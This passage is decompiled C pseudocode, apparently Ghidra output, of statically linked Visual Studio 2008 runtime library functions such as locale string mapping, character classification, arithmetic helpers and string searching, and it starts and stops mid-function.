    if (param_1 < 0x17e0) {
      return -1;
    }
    if (param_1 < 0x17ea) goto LAB_0041d267;
    iVar1 = 0x1810;
    if (param_1 < 0x1810) {
      return -1;
    }
    uVar2 = 0x181a;
  }
  else {
    uVar2 = 0xff1a;
  }
  if (uVar2 <= param_1) {
    return -1;
  }
LAB_0041d267:
  return (uint)param_1 - iVar1;
}



// Library Function - Single Match
//  __iswctype_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __iswctype_l(wint_t _C,wctype_t _Type,_locale_t _Locale)

{
  BOOL BVar1;
  localeinfo_struct local_18;
  int local_10;
  char local_c;
  ushort local_8 [2];
  
  if (_C == 0xffff) {
    local_8[0] = 0;
  }
  else if (_C < 0x100) {
    local_8[0] = *(ushort *)(PTR_DAT_0042be94 + (uint)_C * 2) & _Type;
  }
  else {
    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_18,_Locale);
    BVar1 = ___crtGetStringTypeW(&local_18,1,(LPCWSTR)&_C,1,local_8);
    if (BVar1 == 0) {
      local_8[0] = 0;
    }
    if (local_c != '\0') {
      *(uint *)(local_10 + 0x70) = *(uint *)(local_10 + 0x70) & 0xfffffffd;
    }
  }
  return (uint)(local_8[0] & _Type);
}



// Library Function - Single Match
//  __allmul
// 
// Library: Visual Studio 2008 Release

longlong __allmul(uint param_1,uint param_2,uint param_3,uint param_4)

{
  if ((param_4 | param_2) == 0) {
    return (ulonglong)param_1 * (ulonglong)param_3;
  }
  return CONCAT44((int)((ulonglong)param_1 * (ulonglong)param_3 >> 0x20) +
                  param_2 * param_3 + param_1 * param_4,
                  (int)((ulonglong)param_1 * (ulonglong)param_3));
}



// Library Function - Single Match
//  __aulldvrm
// 
// Library: Visual Studio 2008 Release

undefined8 __aulldvrm(uint param_1,uint param_2,uint param_3,uint param_4)

{
  ulonglong uVar1;
  longlong lVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  
  uVar3 = param_1;
  uVar8 = param_4;
  uVar6 = param_2;
  uVar9 = param_3;
  if (param_4 == 0) {
    uVar3 = param_2 / param_3;
    iVar4 = (int)(((ulonglong)param_2 % (ulonglong)param_3 << 0x20 | (ulonglong)param_1) /
                 (ulonglong)param_3);
  }
  else {
    do {
      uVar5 = uVar8 >> 1;
      uVar9 = uVar9 >> 1 | (uint)((uVar8 & 1) != 0) << 0x1f;
      uVar7 = uVar6 >> 1;
      uVar3 = uVar3 >> 1 | (uint)((uVar6 & 1) != 0) << 0x1f;
      uVar8 = uVar5;
      uVar6 = uVar7;
    } while (uVar5 != 0);
    uVar1 = CONCAT44(uVar7,uVar3) / (ulonglong)uVar9;
    iVar4 = (int)uVar1;
    lVar2 = (ulonglong)param_3 * (uVar1 & 0xffffffff);
    uVar3 = (uint)((ulonglong)lVar2 >> 0x20);
    uVar8 = uVar3 + iVar4 * param_4;
    if (((CARRY4(uVar3,iVar4 * param_4)) || (param_2 < uVar8)) ||
       ((param_2 <= uVar8 && (param_1 < (uint)lVar2)))) {
      iVar4 = iVar4 + -1;
    }
    uVar3 = 0;
  }
  return CONCAT44(uVar3,iVar4);
}



// Library Function - Single Match
//  __freea
// 
// Library: Visual Studio 2008 Release

void __cdecl __freea(void *_Memory)

{
  if ((_Memory != (void *)0x0) && (*(int *)((int)_Memory + -8) == 0xdddd)) {
    _free((int *)((int)_Memory + -8));
  }
  return;
}



// WARNING: Function: __alloca_probe_16 replaced with injection: alloca_probe
// Library Function - Single Match
//  int __cdecl __crtLCMapStringA_stat(struct localeinfo_struct *,unsigned long,unsigned long,char
// const *,int,char *,int,int,int)
// 
// Library: Visual Studio 2008 Release

int __cdecl
__crtLCMapStringA_stat
          (localeinfo_struct *param_1,ulong param_2,ulong param_3,char *param_4,int param_5,
          char *param_6,int param_7,int param_8,int param_9)

{
  uint uVar1;
  bool bVar2;
  int iVar3;
  DWORD DVar4;
  char *pcVar5;
  uint cchWideChar;
  undefined4 *puVar6;
  UINT UVar7;
  int *in_ECX;
  char *pcVar8;
  LPSTR lpMultiByteStr;
  void *local_14;
  undefined4 *local_10;
  uint local_c;
  uint local_8;
  
  local_8 = DAT_0042b0a0 ^ (uint)&stack0xfffffffc;
  if (DAT_0042db74 == 0) {
    iVar3 = LCMapStringW(0,0x100,L"",1,(LPWSTR)0x0,0);
    if (iVar3 == 0) {
      DVar4 = GetLastError();
      if (DVar4 == 0x78) {
        DAT_0042db74 = 2;
      }
    }
    else {
      DAT_0042db74 = 1;
    }
  }
  pcVar5 = (char *)param_3;
  pcVar8 = param_4;
  if (0 < (int)param_4) {
    do {
      pcVar8 = pcVar8 + -1;
      if (*pcVar5 == '\0') goto LAB_0041d5e6;
      pcVar5 = pcVar5 + 1;
    } while (pcVar8 != (char *)0x0);
    pcVar8 = (char *)0xffffffff;
LAB_0041d5e6:
    pcVar5 = param_4 + -(int)pcVar8;
    bVar2 = (int)(pcVar5 + -1) < (int)param_4;
    param_4 = pcVar5 + -1;
    if (bVar2) {
      param_4 = pcVar5;
    }
  }
  if ((DAT_0042db74 == 2) || (DAT_0042db74 == 0)) {
    local_10 = (undefined4 *)0x0;
    local_14 = (void *)0x0;
    if (param_1 == (localeinfo_struct *)0x0) {
      param_1 = *(localeinfo_struct **)(*in_ECX + 0x14);
    }
    if (param_7 == 0) {
      param_7 = *(int *)(*in_ECX + 4);
    }
    UVar7 = ___ansicp((LCID)param_1);
    if (UVar7 == 0xffffffff) goto LAB_0041d908;
    if (UVar7 == param_7) {
      LCMapStringA((LCID)param_1,param_2,(LPCSTR)param_3,(int)param_4,(LPSTR)param_5,(int)param_6);
    }
    else {
      local_10 = (undefined4 *)
                 ___convertcp(param_7,UVar7,(char *)param_3,(uint *)&param_4,(LPSTR)0x0,0);
      if (local_10 == (undefined4 *)0x0) goto LAB_0041d908;
      local_c = LCMapStringA((LCID)param_1,param_2,(LPCSTR)local_10,(int)param_4,(LPSTR)0x0,0);
      if (local_c != 0) {
        if (((int)local_c < 1) || (0xffffffe0 < local_c)) {
          puVar6 = (undefined4 *)0x0;
        }
        else if (local_c + 8 < 0x401) {
          if (&stack0x00000000 == (undefined *)0x24) goto LAB_0041d8e5;
          puVar6 = (undefined4 *)&stack0xffffffe4;
        }
        else {
          puVar6 = (undefined4 *)_malloc(local_c + 8);
          if (puVar6 != (undefined4 *)0x0) {
            *puVar6 = 0xdddd;
            puVar6 = puVar6 + 2;
          }
        }
        if (puVar6 != (undefined4 *)0x0) {
          _memset(puVar6,0,local_c);
          local_c = LCMapStringA((LCID)param_1,param_2,(LPCSTR)local_10,(int)param_4,(LPSTR)puVar6,
                                 local_c);
          if (local_c != 0) {
            local_14 = (void *)___convertcp(UVar7,param_7,(char *)puVar6,&local_c,(LPSTR)param_5,
                                            (int)param_6);
          }
          __freea(puVar6);
        }
      }
    }
LAB_0041d8e5:
    if (local_10 != (undefined4 *)0x0) {
      _free(local_10);
    }
    if ((local_14 != (void *)0x0) && ((void *)param_5 != local_14)) {
      _free(local_14);
    }
    goto LAB_0041d908;
  }
  if (DAT_0042db74 != 1) goto LAB_0041d908;
  local_c = 0;
  if (param_7 == 0) {
    param_7 = *(int *)(*in_ECX + 4);
  }
  cchWideChar = MultiByteToWideChar(param_7,(uint)(param_8 != 0) * 8 + 1,(LPCSTR)param_3,
                                    (int)param_4,(LPWSTR)0x0,0);
  if (cchWideChar == 0) goto LAB_0041d908;
  if (((int)cchWideChar < 1) || (0xffffffe0 / cchWideChar < 2)) {
    local_10 = (undefined4 *)0x0;
  }
  else {
    uVar1 = cchWideChar * 2 + 8;
    if (uVar1 < 0x401) {
      puVar6 = (undefined4 *)&stack0xffffffdc;
      local_10 = (undefined4 *)&stack0xffffffdc;
      if (&stack0x00000000 != (undefined *)0x24) {
LAB_0041d68e:
        local_10 = puVar6 + 2;
      }
    }
    else {
      puVar6 = (undefined4 *)_malloc(uVar1);
      local_10 = puVar6;
      if (puVar6 != (undefined4 *)0x0) {
        *puVar6 = 0xdddd;
        goto LAB_0041d68e;
      }
    }
  }
  if (local_10 == (undefined4 *)0x0) goto LAB_0041d908;
  iVar3 = MultiByteToWideChar(param_7,1,(LPCSTR)param_3,(int)param_4,(LPWSTR)local_10,cchWideChar);
  if ((iVar3 != 0) &&
     (local_c = LCMapStringW((LCID)param_1,param_2,(LPCWSTR)local_10,cchWideChar,(LPWSTR)0x0,0),
     local_c != 0)) {
    if ((param_2 & 0x400) == 0) {
      if (((int)local_c < 1) || (0xffffffe0 / local_c < 2)) {
        puVar6 = (undefined4 *)0x0;
      }
      else {
        uVar1 = local_c * 2 + 8;
        if (uVar1 < 0x401) {
          if (&stack0x00000000 == (undefined *)0x24) goto LAB_0041d79e;
          puVar6 = (undefined4 *)&stack0xffffffe4;
        }
        else {
          puVar6 = (undefined4 *)_malloc(uVar1);
          if (puVar6 != (undefined4 *)0x0) {
            *puVar6 = 0xdddd;
            puVar6 = puVar6 + 2;
          }
        }
      }
      if (puVar6 != (undefined4 *)0x0) {
        iVar3 = LCMapStringW((LCID)param_1,param_2,(LPCWSTR)local_10,cchWideChar,(LPWSTR)puVar6,
                             local_c);
        if (iVar3 != 0) {
          lpMultiByteStr = (LPSTR)param_5;
          pcVar5 = param_6;
          if (param_6 == (char *)0x0) {
            lpMultiByteStr = (LPSTR)0x0;
            pcVar5 = (char *)0x0;
          }
          local_c = WideCharToMultiByte(param_7,0,(LPCWSTR)puVar6,local_c,lpMultiByteStr,(int)pcVar5
                                        ,(LPCSTR)0x0,(LPBOOL)0x0);
        }
        __freea(puVar6);
      }
    }
    else if ((param_6 != (char *)0x0) && ((int)local_c <= (int)param_6)) {
      LCMapStringW((LCID)param_1,param_2,(LPCWSTR)local_10,cchWideChar,(LPWSTR)param_5,(int)param_6)
      ;
    }
  }
LAB_0041d79e:
  __freea(local_10);
LAB_0041d908:
  iVar3 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar3;
}



// Library Function - Single Match
//  ___crtLCMapStringA
// 
// Library: Visual Studio 2008 Release

int __cdecl
___crtLCMapStringA(_locale_t _Plocinfo,LPCWSTR _LocaleName,DWORD _DwMapFlag,LPCSTR _LpSrcStr,
                  int _CchSrc,LPSTR _LpDestStr,int _CchDest,int _Code_page,BOOL _BError)

{
  int iVar1;
  int in_stack_ffffffec;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&stack0xffffffec,_Plocinfo);
  iVar1 = __crtLCMapStringA_stat
                    ((localeinfo_struct *)_LocaleName,_DwMapFlag,(ulong)_LpSrcStr,(char *)_CchSrc,
                     (int)_LpDestStr,(char *)_CchDest,_Code_page,_BError,in_stack_ffffffec);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return iVar1;
}



// WARNING: Function: __alloca_probe_16 replaced with injection: alloca_probe
// Library Function - Single Match
//  int __cdecl __crtGetStringTypeA_stat(struct localeinfo_struct *,unsigned long,char const
// *,int,unsigned short *,int,int,int)
// 
// Library: Visual Studio 2008 Release

int __cdecl
__crtGetStringTypeA_stat
          (localeinfo_struct *param_1,ulong param_2,char *param_3,int param_4,ushort *param_5,
          int param_6,int param_7,int param_8)

{
  uint _Size;
  BOOL BVar1;
  DWORD DVar2;
  uint cchWideChar;
  undefined4 *puVar3;
  int iVar4;
  ushort *puVar5;
  int *in_ECX;
  undefined4 *lpWideCharStr;
  void *_Memory;
  int *local_c;
  uint local_8;
  
  local_8 = DAT_0042b0a0 ^ (uint)&stack0xfffffffc;
  local_c = in_ECX;
  if (DAT_0042db78 == 0) {
    BVar1 = GetStringTypeW(1,L"",1,(LPWORD)&local_c);
    if (BVar1 == 0) {
      DVar2 = GetLastError();
      if (DVar2 == 0x78) {
        DAT_0042db78 = 2;
      }
      goto LAB_0041d9ba;
    }
    DAT_0042db78 = 1;
  }
  else {
LAB_0041d9ba:
    if ((DAT_0042db78 == 2) || (DAT_0042db78 == 0)) {
      _Memory = (void *)0x0;
      if (param_6 == 0) {
        param_6 = *(int *)(*in_ECX + 0x14);
      }
      if (param_5 == (ushort *)0x0) {
        param_5 = *(ushort **)(*in_ECX + 4);
      }
      puVar5 = (ushort *)___ansicp(param_6);
      if ((puVar5 != (ushort *)0xffffffff) &&
         (((puVar5 == param_5 ||
           (_Memory = (void *)___convertcp((UINT)param_5,(UINT)puVar5,(char *)param_2,
                                           (uint *)&param_3,(LPSTR)0x0,0), param_2 = (ulong)_Memory,
           _Memory != (void *)0x0)) &&
          (GetStringTypeA(param_6,(DWORD)param_1,(LPCSTR)param_2,(int)param_3,(LPWORD)param_4),
          _Memory != (void *)0x0)))) {
        _free(_Memory);
      }
      goto LAB_0041db07;
    }
    if (DAT_0042db78 != 1) goto LAB_0041db07;
  }
  local_c = (int *)0x0;
  if (param_5 == (ushort *)0x0) {
    param_5 = *(ushort **)(*in_ECX + 4);
  }
  cchWideChar = MultiByteToWideChar((UINT)param_5,(uint)(param_7 != 0) * 8 + 1,(LPCSTR)param_2,
                                    (int)param_3,(LPWSTR)0x0,0);
  if (cchWideChar == 0) goto LAB_0041db07;
  lpWideCharStr = (undefined4 *)0x0;
  if ((0 < (int)cchWideChar) && (cchWideChar < 0x7ffffff1)) {
    _Size = cchWideChar * 2 + 8;
    if (_Size < 0x401) {
      puVar3 = (undefined4 *)&stack0xffffffe8;
      lpWideCharStr = (undefined4 *)&stack0xffffffe8;
      if (&stack0x00000000 != (undefined *)0x18) {
LAB_0041da4a:
        lpWideCharStr = puVar3 + 2;
      }
    }
    else {
      puVar3 = (undefined4 *)_malloc(_Size);
      lpWideCharStr = puVar3;
      if (puVar3 != (undefined4 *)0x0) {
        *puVar3 = 0xdddd;
        goto LAB_0041da4a;
      }
    }
  }
  if (lpWideCharStr != (undefined4 *)0x0) {
    _memset(lpWideCharStr,0,cchWideChar * 2);
    iVar4 = MultiByteToWideChar((UINT)param_5,1,(LPCSTR)param_2,(int)param_3,(LPWSTR)lpWideCharStr,
                                cchWideChar);
    if (iVar4 != 0) {
      local_c = (int *)GetStringTypeW((DWORD)param_1,(LPCWSTR)lpWideCharStr,iVar4,(LPWORD)param_4);
    }
    __freea(lpWideCharStr);
  }
LAB_0041db07:
  iVar4 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar4;
}



// Library Function - Single Match
//  ___crtGetStringTypeA
// 
// Library: Visual Studio 2008 Release

BOOL __cdecl
___crtGetStringTypeA
          (_locale_t _Plocinfo,DWORD _DWInfoType,LPCSTR _LpSrcStr,int _CchSrc,LPWORD _LpCharType,
          int _Code_page,BOOL _BError)

{
  int iVar1;
  int in_stack_00000020;
  int in_stack_ffffffec;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&stack0xffffffec,_Plocinfo);
  iVar1 = __crtGetStringTypeA_stat
                    ((localeinfo_struct *)_DWInfoType,(ulong)_LpSrcStr,(char *)_CchSrc,
                     (int)_LpCharType,(ushort *)_Code_page,_BError,in_stack_00000020,
                     in_stack_ffffffec);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return iVar1;
}



// Library Function - Single Match
//  ___free_lc_time
// 
// Library: Visual Studio 2008 Release

void __cdecl ___free_lc_time(void **param_1)

{
  if (param_1 != (void **)0x0) {
    _free(param_1[1]);
    _free(param_1[2]);
    _free(param_1[3]);
    _free(param_1[4]);
    _free(param_1[5]);
    _free(param_1[6]);
    _free(*param_1);
    _free(param_1[8]);
    _free(param_1[9]);
    _free(param_1[10]);
    _free(param_1[0xb]);
    _free(param_1[0xc]);
    _free(param_1[0xd]);
    _free(param_1[7]);
    _free(param_1[0xe]);
    _free(param_1[0xf]);
    _free(param_1[0x10]);
    _free(param_1[0x11]);
    _free(param_1[0x12]);
    _free(param_1[0x13]);
    _free(param_1[0x14]);
    _free(param_1[0x15]);
    _free(param_1[0x16]);
    _free(param_1[0x17]);
    _free(param_1[0x18]);
    _free(param_1[0x19]);
    _free(param_1[0x1a]);
    _free(param_1[0x1b]);
    _free(param_1[0x1c]);
    _free(param_1[0x1d]);
    _free(param_1[0x1e]);
    _free(param_1[0x1f]);
    _free(param_1[0x20]);
    _free(param_1[0x21]);
    _free(param_1[0x22]);
    _free(param_1[0x23]);
    _free(param_1[0x24]);
    _free(param_1[0x25]);
    _free(param_1[0x26]);
    _free(param_1[0x27]);
    _free(param_1[0x28]);
    _free(param_1[0x29]);
    _free(param_1[0x2a]);
  }
  return;
}



// Library Function - Single Match
//  ___free_lconv_num
// 
// Library: Visual Studio 2008 Release

void __cdecl ___free_lconv_num(void **param_1)

{
  if (param_1 != (void **)0x0) {
    if ((undefined *)*param_1 != PTR_DAT_0042bf58) {
      _free(*param_1);
    }
    if ((undefined *)param_1[1] != PTR_DAT_0042bf5c) {
      _free(param_1[1]);
    }
    if ((undefined *)param_1[2] != PTR_DAT_0042bf60) {
      _free(param_1[2]);
    }
  }
  return;
}



// Library Function - Single Match
//  ___free_lconv_mon
// 
// Library: Visual Studio 2008 Release

void __cdecl ___free_lconv_mon(int param_1)

{
  if (param_1 != 0) {
    if (*(undefined **)(param_1 + 0xc) != PTR_DAT_0042bf64) {
      _free(*(undefined **)(param_1 + 0xc));
    }
    if (*(undefined **)(param_1 + 0x10) != PTR_DAT_0042bf68) {
      _free(*(undefined **)(param_1 + 0x10));
    }
    if (*(undefined **)(param_1 + 0x14) != PTR_DAT_0042bf6c) {
      _free(*(undefined **)(param_1 + 0x14));
    }
    if (*(undefined **)(param_1 + 0x18) != PTR_DAT_0042bf70) {
      _free(*(undefined **)(param_1 + 0x18));
    }
    if (*(undefined **)(param_1 + 0x1c) != PTR_DAT_0042bf74) {
      _free(*(undefined **)(param_1 + 0x1c));
    }
    if (*(undefined **)(param_1 + 0x20) != PTR_DAT_0042bf78) {
      _free(*(undefined **)(param_1 + 0x20));
    }
    if (*(undefined **)(param_1 + 0x24) != PTR_DAT_0042bf7c) {
      _free(*(undefined **)(param_1 + 0x24));
    }
  }
  return;
}



// Library Function - Single Match
//  _strcspn
// 
// Library: Visual Studio

size_t __cdecl _strcspn(char *_Str,char *_Control)

{
  byte bVar1;
  byte *pbVar2;
  size_t sVar3;
  undefined4 uStack_28;
  undefined4 uStack_24;
  undefined4 uStack_20;
  undefined4 uStack_1c;
  undefined4 uStack_18;
  undefined4 uStack_14;
  undefined4 uStack_10;
  undefined4 uStack_c;
  
  uStack_c = 0;
  uStack_10 = 0;
  uStack_14 = 0;
  uStack_18 = 0;
  uStack_1c = 0;
  uStack_20 = 0;
  uStack_24 = 0;
  uStack_28 = 0;
  while( true ) {
    bVar1 = *_Control;
    if (bVar1 == 0) break;
    _Control = (char *)((byte *)_Control + 1);
    pbVar2 = (byte *)((int)&uStack_28 + ((int)(uint)bVar1 >> 3));
    *pbVar2 = *pbVar2 | '\x01' << (bVar1 & 7);
  }
  sVar3 = 0xffffffff;
  do {
    sVar3 = sVar3 + 1;
    bVar1 = *_Str;
    if (bVar1 == 0) {
      return sVar3;
    }
    _Str = (char *)((byte *)_Str + 1);
  } while ((*(byte *)((int)&uStack_28 + ((int)(uint)bVar1 >> 3)) >> (bVar1 & 7) & 1) == 0);
  return sVar3;
}



// Library Function - Single Match
//  _strpbrk
// 
// Library: Visual Studio

char * __cdecl _strpbrk(char *_Str,char *_Control)

{
  byte bVar1;
  byte *pbVar2;
  undefined4 uStack_28;
  undefined4 uStack_24;
  undefined4 uStack_20;
  undefined4 uStack_1c;
  undefined4 uStack_18;
  undefined4 uStack_14;
  undefined4 uStack_10;
  undefined4 uStack_c;
  
  uStack_c = 0;
  uStack_10 = 0;
  uStack_14 = 0;
  uStack_18 = 0;
  uStack_1c = 0;
  uStack_20 = 0;
  uStack_24 = 0;
  uStack_28 = 0;
  while( true ) {
    bVar1 = *_Control;
    if (bVar1 == 0) break;
    _Control = (char *)((byte *)_Control + 1);
    pbVar2 = (byte *)((int)&uStack_28 + ((int)(uint)bVar1 >> 3));
    *pbVar2 = *pbVar2 | '\x01' << (bVar1 & 7);
  }
  do {
    pbVar2 = (byte *)_Str;
    bVar1 = *pbVar2;
    if (bVar1 == 0) {
      return (char *)(uint)bVar1;
    }
    _Str = (char *)(pbVar2 + 1);
  } while ((*(byte *)((int)&uStack_28 + ((int)(char *)(uint)bVar1 >> 3)) >> (bVar1 & 7) & 1) == 0);
  return (char *)pbVar2;
}



// Library Function - Single Match
//  ___crtLCMapStringW
// 
// Library: Visual Studio 2008 Release

int __cdecl
___crtLCMapStringW(LPCWSTR _LocaleName,DWORD _DWMapFlag,LPCWSTR _LpSrcStr,int _CchSrc,
                  LPWSTR _LpDestStr,int _CchDest)

{
  int iVar1;
  short *psVar2;
  LPWSTR pWVar3;
  int in_stack_0000001c;
  _LocaleUpdate local_14 [8];
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate(local_14,(localeinfo_struct *)_LocaleName);
  psVar2 = (short *)_CchSrc;
  pWVar3 = _LpDestStr;
  if (0 < (int)_LpDestStr) {
    do {
      pWVar3 = (LPWSTR)((int)pWVar3 + -1);
      if (*psVar2 == 0) goto LAB_0041de8f;
      psVar2 = psVar2 + 1;
    } while (pWVar3 != (LPWSTR)0x0);
    pWVar3 = (LPWSTR)0xffffffff;
LAB_0041de8f:
    _LpDestStr = (LPWSTR)((int)_LpDestStr + (-1 - (int)pWVar3));
  }
  iVar1 = LCMapStringW(_DWMapFlag,(DWORD)_LpSrcStr,(LPCWSTR)_CchSrc,(int)_LpDestStr,(LPWSTR)_CchDest
                       ,in_stack_0000001c);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return iVar1;
}



int __cdecl FUN_0041deb7(short *param_1)

{
  short sVar1;
  short *psVar2;
  
  psVar2 = param_1;
  do {
    sVar1 = *psVar2;
    psVar2 = psVar2 + 1;
  } while (sVar1 != 0);
  return ((int)psVar2 - (int)param_1 >> 1) + -1;
}



// Library Function - Single Match
//  int __cdecl _ValidateRead(void const *,unsigned int)
// 
// Library: Visual Studio 2008 Release

int __cdecl _ValidateRead(void *param_1,uint param_2)

{
  return (uint)(param_1 != (void *)0x0);
}



// Library Function - Single Match
//  __isdigit_l
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl __isdigit_l(int _C,_locale_t _Locale)

{
  uint uVar1;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Locale);
  if ((int)(local_14.locinfo)->locale_name[3] < 2) {
    uVar1 = *(ushort *)(local_14.locinfo[1].lc_category[0].locale + _C * 2) & 4;
  }
  else {
    uVar1 = __isctype_l(_C,4,&local_14);
  }
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return uVar1;
}



// Library Function - Single Match
//  _isdigit
// 
// Library: Visual Studio 2008 Release

int __cdecl _isdigit(int _C)

{
  int iVar1;
  
  if (DAT_0042d8b8 == 0) {
    return *(ushort *)(PTR_DAT_0042bdd8 + _C * 2) & 4;
  }
  iVar1 = __isdigit_l(_C,(_locale_t)0x0);
  return iVar1;
}



// Library Function - Single Match
//  __isxdigit_l
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl __isxdigit_l(int _C,_locale_t _Locale)

{
  uint uVar1;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Locale);
  if ((int)(local_14.locinfo)->locale_name[3] < 2) {
    uVar1 = *(ushort *)(local_14.locinfo[1].lc_category[0].locale + _C * 2) & 0x80;
  }
  else {
    uVar1 = __isctype_l(_C,0x80,&local_14);
  }
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return uVar1;
}



// Library Function - Single Match
//  _isxdigit
// 
// Library: Visual Studio 2008 Release

int __cdecl _isxdigit(int _C)

{
  int iVar1;
  
  if (DAT_0042d8b8 == 0) {
    return *(ushort *)(PTR_DAT_0042bdd8 + _C * 2) & 0x80;
  }
  iVar1 = __isxdigit_l(_C,(_locale_t)0x0);
  return iVar1;
}



// Library Function - Multiple Matches With Different Base Names
//  __iscntrl_l
//  __isdigit_l
//  __islower_l
//  __ispunct_l
//   6 names - too many to list
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl FID_conflict___isspace_l(int _C,_locale_t _Locale)

{
  uint uVar1;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Locale);
  if ((int)(local_14.locinfo)->locale_name[3] < 2) {
    uVar1 = *(ushort *)(local_14.locinfo[1].lc_category[0].locale + _C * 2) & 8;
  }
  else {
    uVar1 = __isctype_l(_C,8,&local_14);
  }
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return uVar1;
}



// Library Function - Single Match
//  _isspace
// 
// Library: Visual Studio 2008 Release

int __cdecl _isspace(int _C)

{
  int iVar1;
  
  if (DAT_0042d8b8 == 0) {
    return *(ushort *)(PTR_DAT_0042bdd8 + _C * 2) & 8;
  }
  iVar1 = FID_conflict___isspace_l(_C,(_locale_t)0x0);
  return iVar1;
}



// Library Function - Single Match
//  _strrchr
// 
// Library: Visual Studio 2008 Release

char * __cdecl _strrchr(char *_Str,int _Ch)

{
  char cVar1;
  int iVar2;
  char *pcVar3;
  char *pcVar4;
  
  iVar2 = -1;
  do {
    pcVar4 = _Str;
    if (iVar2 == 0) break;
    iVar2 = iVar2 + -1;
    pcVar4 = _Str + 1;
    cVar1 = *_Str;
    _Str = pcVar4;
  } while (cVar1 != '\0');
  iVar2 = -(iVar2 + 1);
  pcVar4 = pcVar4 + -1;
  do {
    pcVar3 = pcVar4;
    if (iVar2 == 0) break;
    iVar2 = iVar2 + -1;
    pcVar3 = pcVar4 + -1;
    cVar1 = *pcVar4;
    pcVar4 = pcVar3;
  } while ((char)_Ch != cVar1);
  pcVar3 = pcVar3 + 1;
  if (*pcVar3 != (char)_Ch) {
    pcVar3 = (char *)0x0;
  }
  return pcVar3;
}



// Library Function - Single Match
//  __tolower_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __tolower_l(int _C,_locale_t _Locale)

{
  int iVar1;
  uint uVar2;
  int iVar3;
  int *piVar4;
  CHAR CVar5;
  localeinfo_struct local_1c;
  int local_14;
  char local_10;
  byte local_c;
  undefined local_b;
  CHAR local_8;
  CHAR local_7;
  undefined local_6;
  
  iVar1 = _C;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_1c,_Locale);
  if ((uint)_C < 0x100) {
    if ((int)(local_1c.locinfo)->locale_name[3] < 2) {
      uVar2 = *(ushort *)(local_1c.locinfo[1].lc_category[0].locale + _C * 2) & 1;
    }
    else {
      uVar2 = __isctype_l(_C,1,&local_1c);
    }
    if (uVar2 == 0) {
LAB_0041e0fe:
      if (local_10 == '\0') {
        return iVar1;
      }
      *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
      return iVar1;
    }
    uVar2 = (uint)*(byte *)((int)local_1c.locinfo[1].lc_category[0].wlocale + _C);
  }
  else {
    CVar5 = (CHAR)_C;
    if (((int)(local_1c.locinfo)->locale_name[3] < 2) ||
       (iVar3 = __isleadbyte_l(_C >> 8 & 0xff,&local_1c), iVar3 == 0)) {
      piVar4 = __errno();
      *piVar4 = 0x2a;
      local_7 = '\0';
      iVar3 = 1;
      local_8 = CVar5;
    }
    else {
      _C._0_1_ = (CHAR)((uint)_C >> 8);
      local_8 = (CHAR)_C;
      local_6 = 0;
      iVar3 = 2;
      local_7 = CVar5;
    }
    iVar3 = ___crtLCMapStringA(&local_1c,(local_1c.locinfo)->lc_category[0].wlocale,0x100,&local_8,
                               iVar3,(LPSTR)&local_c,3,(local_1c.locinfo)->lc_codepage,1);
    if (iVar3 == 0) goto LAB_0041e0fe;
    uVar2 = (uint)local_c;
    if (iVar3 != 1) {
      uVar2 = (uint)CONCAT11(local_c,local_b);
    }
  }
  if (local_10 != '\0') {
    *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
  }
  return uVar2;
}



// Library Function - Single Match
//  _tolower
// 
// Library: Visual Studio 2008 Release

int __cdecl _tolower(int _C)

{
  if (DAT_0042d8b8 == 0) {
    if (_C - 0x41U < 0x1a) {
      return _C + 0x20;
    }
  }
  else {
    _C = __tolower_l(_C,(_locale_t)0x0);
  }
  return _C;
}



// Library Function - Multiple Matches With Different Base Names
//  __atodbl_l
//  __atoflt_l
// 
// Library: Visual Studio 2008 Release

int __cdecl FID_conflict___atoflt_l(_CRT_FLOAT *_Result,char *_Str,_locale_t _Locale)

{
  INTRNCVT_STATUS IVar1;
  int iVar2;
  char *local_2c;
  localeinfo_struct local_28;
  int local_20;
  char local_1c;
  uint local_18;
  _LDBL12 local_14;
  uint local_8;
  
  local_8 = DAT_0042b0a0 ^ (uint)&stack0xfffffffc;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_28,_Locale);
  local_18 = ___strgtold12_l(&local_14,&local_2c,_Str,0,0,0,0,&local_28);
  IVar1 = FID_conflict___ld12tod(&local_14,(_CRT_DOUBLE *)_Result);
  if ((local_18 & 3) == 0) {
    if (IVar1 == INTRNCVT_OVERFLOW) {
LAB_0041e237:
